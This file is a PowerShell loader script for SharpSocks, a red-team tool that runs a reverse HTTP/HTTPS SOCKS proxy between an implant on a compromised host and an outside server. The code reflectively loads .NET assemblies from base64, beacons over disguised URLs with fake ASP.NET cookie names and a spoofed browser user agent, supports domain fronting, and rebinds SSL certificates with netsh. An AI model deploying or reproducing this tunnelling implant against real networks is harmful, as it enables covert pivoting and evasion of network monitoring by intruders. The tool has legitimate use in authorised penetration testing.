$SocksClientLoaded = $False
$SocksServerLoaded = $False
$Socks = $null
$BoolStart = $null
$iLogOutput = $null
$Comms = $null
function SharpSocks {
<#
.Synopsis
    Socks Proxy written in C# for .NET v4

    Reverse HTTP/HTTPS tunnelling socks4a proxy written in C# and deployable via PowerShell

    SharpSocks 2017 Nettitude
    Rob Maslen @rbmaslen 

    IMPORTANT: To use HTTPS a certificate must be installed (see Step 2 onwards in https://stackoverflow.com/questions/11403333/httplistener-with-https-support/11457719#11457719 )

.DESCRIPTION
	PS C:\> Usage: SharpSocks -Uri <Host> 
.EXAMPLE
    PS C:\> SharpSocks -Server -IPAddress 127.0.0.1 -Uri http://127.0.0.1:8081 -SocksPort 1080 
.EXAMPLE
    PS C:\> SharpSocks -Server -IPAddress 127.0.0.1 -Uri https://127.0.0.1:8081 -SocksPort 1080 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6
.EXAMPLE
    PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access.php","upload/data/images" -Beacon 500
.EXAMPLE
    PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access.php","upload/data/images" -Beacon 5000 -SSLFullValidation
.EXAMPLE
    PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
#>
param(
[Parameter(Mandatory=$True)][string]$Uri, 
[Parameter(Mandatory=$False)]$URLs="Upload", 
[Parameter(Mandatory=$False)][switch]$Server, 
[Parameter(Mandatory=$False)][switch]$Client, 
[Parameter(Mandatory=$False)][int]$SocksPort=43334, 
[Parameter(Mandatory=$False)][string]$Channel,
[Parameter(Mandatory=$False)][string]$IPAddress="0.0.0.0",
[Parameter(Mandatory=$False)][string]$DomainFrontURL,
[Parameter(Mandatory=$False)][int]$Beacon="2000",
[Parameter(Mandatory=$False)][string]$Key,
[Parameter(Mandatory=$False)][switch]$SSLFullValidation,
[Parameter(Mandatory=$False)][string]$UserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
[Parameter(Mandatory=$False)][string]$Cookie1="ASP.NET_SessionId",
[Parameter(Mandatory=$False)][string]$Cookie2="__RequestVerificationToken",
[Parameter(Mandatory=$False)][string]$ProxyURL,
[Parameter(Mandatory=$False)][string]$ProxyUser,
[Parameter(Mandatory=$False)][string]$ProxyPassword
)

if ($psversiontable.CLRVersion.Major -lt 3) {
    echo "Not running on CLRVersion 4 or Above"
    break
}

if (($SocksClientLoaded -ne "TRUE") -and ($Client.IsPresent)) {
    $Script:SocksClientLoaded = "TRUE"
    echo "Loading Client Assembly"
    $PS = ""
    $DllBytes  = [System.Convert]::FromBase64String($PS)
    $Assembly = [System.Reflection.Assembly]::Load($DllBytes)
}

if (($SocksServerLoaded -ne "TRUE") -and ($Server.IsPresent)) {
    $Script:SocksServerLoaded = "TRUE"
    echo "Loading Server Assembly"
    $PS = ""
    $DllBytes  = [System.Convert]::FromBase64String($PS)
    $Assembly = [System.Reflection.Assembly]::Load($DllBytes)
}

if ($Server.IsPresent -and ($Uri.ToString().ToLower().Contains("https"))) {
    $newuri = $Uri -replace "https://",""
    $splituri = $newuri -split ":"
    $SSLPort = $splituri[1]
    $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $IPAddress | select thumbprint -ExpandProperty thumbprint
    $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:$sslport
    $Added = netsh.exe http add sslcert ipport=0.0.0.0:$sslport certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
    if ($Added = "SSL Certificate successfully added") {
        $cert = netsh.exe http show sslcert ipport=0.0.0.0:$sslport
    } else {
        Write-Error "Error adding the certificate" 
        Break
    }
}

if($SSLFullValidation.IsPresent) {
    $SSLValidation=$true
} else {
    $SSLValidation=$false
}

if (!$Key) {
$Key = Create-AesKey
}

$secureStringPwd = $Key | ConvertTo-SecureString -AsPlainText -Force 

#If there is no channel set
if (!$Channel) {
$Channel = Get-RandomChamnnel -Length 25
}

# Proxy Config
if ($ProxyURL) {
    $Proxy = New-Object System.Net.WebProxy($ProxyURL,$True); 

    if ($ProxyUser -and $ProxyPassword) {
        $PSS = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force; 
        $Creds = new-object system.management.automation.PSCredential $ProxyUser,$PSS; 
        $Proxy.Credentials = $Creds;
    } else { 
        $Proxy.UseDefaultCredentials = $True;
    } 
} else {
    $Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
}

# New Uri
$Uri = [System.Uri]$Uri

# Add URLs
$NewURLs = New-Object "System.Collections.Generic.List[String]"
foreach ($URL in $URLs) {
$NewURLs.Add($URL)
}

if ($Server.IsPresent){
    $Script:iLogOutput = New-Object  SharpSocksServer.ServerComms.DebugConsoleOutput
    $Script:BoolStart = [SharpSocksServer.Source.Integration.PSSocksServer]::CreateSocksController($IPAddress, $uri, $Channel, $SocksPort, $key, $Cookie1, $Cookie2, $iLogOutput);
    if ($BoolStart) {
        echo "" 
        echo "[+] SharpSocks server started!"
        echo ""
        echo "Channel: $Channel"
        echo "Key being used: $Key"
        echo "Cookies: $Cookie1 $Cookie2"
        echo ""
        echo "" 
        echo "[-] Run StopSocks to stop the server!"
        echo ""
    }
}

if ($Client.IsPresent){
    $Script:Comms = New-Object SocksProxy.Classes.Integration.PoshDefaultImplantComms
    $Script:Socks = [SocksProxy.Classes.Integration.PoshCreateProxy]::CreateSocksController($Uri, $Channel, $DomainFrontURL, $UserAgent, $secureStringPwd, $NewURLs, $Cookie1, $Cookie2, $Proxy, $Beacon, $Comms, $SSLValidation);
    $Script:BoolStart = $Socks.Start()
    if ($BoolStart) {
        echo "" 
        echo "[+] SharpSocks client Started!"
        echo ""
        echo "URLs:"
        foreach ($URL in $URLs) {
        echo "$($Uri)$($URL)"
        }
        echo "Channel: $Channel"
        echo "Key being used: $Key"
        echo "Beacon: $Beacon"
        echo "Cookies: $Cookie1 $Cookie2"
        echo "User-Agent: $UserAgent"
        echo ""
        echo "" 
        echo "[-] Run StopSocks to stop the client!"
        echo ""
    }
}

}

function StopSocks {
    if ($BoolStart) {
        $Script:BoolStart = $Socks.Stop()
        $Script:BoolStart = $Socks.HARDStop()
        echo "" 
        echo "[-] SharpSocks stopped!"
        echo ""
    } else {
        echo "" 
        echo "[-] SharpSocks not running!"
        echo ""
    }
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Get-RandomChamnnel 
{
    param ([int]$Length)
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {
        $result += $set | Get-Random
    }
    return $result
}